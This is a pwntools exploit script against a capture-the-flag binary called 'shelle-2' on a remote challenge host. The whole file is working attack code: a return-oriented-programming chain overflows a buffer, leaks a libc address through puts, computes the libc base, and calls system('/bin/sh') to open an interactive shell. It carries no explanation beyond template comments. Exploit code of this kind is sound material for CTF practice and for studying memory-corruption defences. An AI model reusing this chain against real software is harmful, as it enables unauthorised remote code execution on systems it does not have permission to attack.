#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.ctf.games --port 30793 ./shelle-2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./shelle-2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.ctf.games'
port = int(args.PORT or 30087)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x000000000040134b
b *0x0000000000401502
b *0x401467
b *0x000000000040156b
continue
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()


libc = ELF("./libc6_2.31-0ubuntu9.2_amd64.so")

pop_5= 0x00000000004015eb
pop_4= 0x00000000004015ec
pop_3= 0x00000000004015ee
pop_2= 0x00000000004015f0
pop_1= 0x00000000004015f2
pop_rdi = 0x00000000004015f3
pop_rsi = 0x00000000004015f1
p =  '\\'*(0x200+1-32)

p += p64(pop_5)
p += p64(0)*5
p += p64(pop_4)
p += p64(0)*4
p += p64(pop_3)
p += p64(0)*3

p += p64(pop_rdi)
p += p64(exe.got['puts']) # getline memset strncpy free setbuf strcmp fwrite
p += p64(exe.plt['puts'])
p += p64(exe.sym['main'])


io.sendlineafter("psuedoshell$",p)
io.sendlineafter("psuedoshell$",'exit')

try:
    leak = u64(io.recvline()[:-1].ljust(8,"\x00"))
    print hex(leak)
except:
    print 'STOP'

libc.address = leak - libc.sym['puts']
print hex(libc.address)

bin_sh = libc.search("/bin/sh").next()
system = libc.sym['system']

p =  '\\'*(0x200+1-32)
p += p64(pop_4)
p += p64(0)*4
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(pop_1)
p += p64(0)*1
p += p64(pop_rdi+1)
p += p64(system)
p += p64(exe.sym['main'])

io.sendlineafter("psuedoshell$",p)
io.sendlineafter("psuedoshell$",'exit')


io.interactive()

